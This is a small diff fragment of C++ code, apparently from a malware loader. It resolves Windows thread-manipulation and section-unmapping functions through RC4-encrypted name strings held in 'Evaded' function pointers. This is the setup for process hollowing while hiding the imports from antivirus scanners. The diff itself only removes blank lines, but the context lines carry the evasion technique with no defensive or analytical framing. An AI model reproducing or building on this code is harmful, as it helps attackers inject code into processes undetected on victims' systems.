@@ -75,10 +75,5 @@ namespace hiddenImp {
         EvSetThreadContext = (EvadedSetThreadContext)EvGetProcAddress(EvGetModuleHandleA(kernelDLL), (LPCSTR)rc4.crypt((char*)"\xB1\x56\x63\x14\xC1\x1C\x59\x9B\x08\xA9\x7F\x82\xBD\xE2\xBC\x3C", key, strlen(key), 16));
         EvResumeThread = (EvadedResumeThread)EvGetProcAddress(EvGetModuleHandleA(kernelDLL), (LPCSTR)rc4.crypt((char*)"\xB0\x56\x64\x35\xC4\x0B\x68\x92\x1E\x8F\x71\x88", key, strlen(key), 12));
         EvNtUnmapViewOfSection = (EvadedNtUnmapViewOfSection)EvGetProcAddress(EvGetModuleHandleA(ntDLL), (LPCSTR)rc4.crypt((char*)"\xAC\x47\x42\x2E\xC4\x0F\x4C\xAC\x05\x8F\x67\xA3\xAF\xD4\xA1\x2B\xF5\x72\x3F\xDF", key, strlen(key), 20));
-
     }
 }
-
-
-
-
